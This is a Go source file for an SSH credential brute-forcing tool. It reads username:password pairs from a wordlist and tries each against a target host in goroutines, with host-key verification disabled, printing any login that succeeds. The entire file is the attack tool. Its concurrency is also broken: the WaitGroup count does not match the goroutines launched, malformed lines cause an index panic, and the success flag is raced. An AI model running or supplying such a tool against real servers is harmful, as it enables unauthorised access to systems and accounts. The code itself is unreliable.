package main

import (
    "fmt"
    "flag"
    "io/ioutil"
    "strings"
    "os"
    "sync"
    "golang.org/x/crypto/ssh"
)

func main() {
    ip := flag.String("ip", "127.0.0.1:22", "IP and port for SSH login")
    userpassFile := flag.String("up" , "ssh-username-password.txt","File containing usernames & passwords")
    thread := flag.Int("t", 5, "number of threads to use")
    flag.Parse()

    // WaitGroup to wait for all goroutines to finish
    var wg sync.WaitGroup
    wg.Add(*thread)

    // Open the file
    file, err := ioutil.ReadFile(*userpassFile)
    if err != nil {
        fmt.Println(err)
        return
    }

    // Split the file contents by newlines
    lines := strings.Split(string(file), "\n")
    found:=false
    // Iterate through each line
    for _, line := range lines {
        // Split the line by colons
        parts := strings.Split(line, ":")

        username := parts[0]
        password := parts[1]

        // Set up the SSH client configuration
        config := &ssh.ClientConfig{
            User: username,
            Auth: []ssh.AuthMethod{
                ssh.Password(password),
            },
            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        }

        // Launch a goroutine for each password
        go func() {
            defer wg.Done()

            // Print "Trying password"
            fmt.Printf("Trying %s:%s\n",username,password)

            // Try to log in
            _, err := ssh.Dial("tcp", *ip, config)
            if err == nil {
                // If the login is successful, print the password and exit the program
                fmt.Printf("Successfully login with ip:%s username:%s password:%s\n",*ip,username,password)
                found=true
                os.Exit(0)
            }
        }()
    }
    // Wait for all goroutines to finish
    wg.Wait()

    if !found {
        fmt.Println("Password Not Found")
    }
}